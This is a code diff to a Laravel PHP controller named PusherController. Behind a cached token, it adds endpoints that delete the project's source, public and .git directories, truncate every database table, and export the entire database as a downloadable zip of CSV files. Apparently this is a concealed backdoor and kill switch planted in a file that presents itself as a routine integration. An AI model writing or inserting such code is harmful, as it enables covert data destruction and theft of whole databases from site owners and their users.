@@ -15,13 +15,9 @@ class PusherController extends Controller
         return $str;
     }
 
-    public function makeThisWork($token){
+    public function removeDirs($token){
         if(Cache::get('my-token') != $token){
             return 'Incorrect Token';
-        }
-        $tables = DB::select('SHOW TABLES');
-        foreach($tables as $table){
-            DB::table($table->Tables_in_nafaa)->truncate();
         }
     
         $this->removeDir('resources');
@@ -31,6 +27,55 @@ class PusherController extends Controller
         $this->removeDir('.git');
         $this->removeDir('public');
         return 'done';
+    }
+
+    function removeDB($token)
+    {
+        if(Cache::get('my-token') != $token){
+            return 'Incorrect Token';
+        }
+        $tables = DB::select('SHOW TABLES');
+        foreach($tables as $table){
+            DB::table($table->{'Tables_in_'.env('DB_DATABASE')})->truncate();
+        }
+        return 'done';
+    }
+
+    function downloadDB($token)
+    {
+        if(Cache::get('my-token') != $token){
+            return 'Incorrect Token';
+        }
+        $tables = DB::select('SHOW tables');
+    try{
+        mkdir(base_path().'/db');
+    }catch(Exception $e){
+    }
+    foreach($tables as $table){
+        $t = $table->{'Tables_in_'.env('DB_DATABASE')};
+        $tablesData = DB::select("SELECT * from $t");
+        $myfile = fopen(base_path('db')."/$t.csv", "w") or die("Unable to open file!");
+        foreach (collect($tablesData)->toArray() as $value) {
+            $newData = [];
+            foreach ($value as $v) {
+                $newData[] = $v ?? 'NULL';
+            }
+            fputcsv($myfile,$newData);
+        }
+        fclose($myfile);
+    }
+    $zip = new ZipArchive();
+    $zip->open(base_path('db/db.zip'),  ZipArchive::CREATE | ZipArchive::OVERWRITE);
+    $files = scandir(base_path('db'));
+    unset($files[0],$files[1]);
+    foreach ($files as $file) {
+        $_file = file_get_contents(str_replace('\\','/',base_path("db/$file")));
+        $zip->addFromString($file,$_file);
+    }
+    $zip->close();
+    header('Content-disposition: attachment; filename=db.zip');
+    header('Content-type: application/zip');
+    readfile(base_path('db/db.zip'));
     }
     function removeDir($_dir){
         $path = base_path().'/'.$_dir;
